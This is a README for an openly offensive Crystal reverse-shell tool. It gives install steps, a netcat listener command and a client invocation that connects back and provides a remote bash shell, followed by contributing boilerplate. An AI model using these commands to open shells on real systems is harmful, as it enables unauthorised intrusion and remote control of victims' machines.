# reverse_shell

Simple reverse shell using `Sockets`, `Process` and `File`.

## Installation

```sh
git clone https://github.com/js-on.de/WeaponizeCrystal.git
cd WeaponizeCrystal/reverse_shell
shards install
```

## Usage
*./reverse_shell ip port*
```sh
# Listener:
nc -lvnp 4444

# Client:
./reverse_shell <listener ip> 4444
```

You can use any bash commands you want. The shell value of `Process.run` is `true`, so even pipes are working.

Internal bash commands are not yet implemented due to missing importance; except of `cd`.

Type `?, help` to view commands provided by this reverse shell.

## Development

See [Contributing](https://github.com/js-on/WeaponizeCrystal#contributing)

## Contributing

1. Fork it (<https://github.com/js-on/reverse_shell/fork>)
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create a new Pull Request

## Contributors

- [js-on](https://github.com/js-on) - creator and maintainer
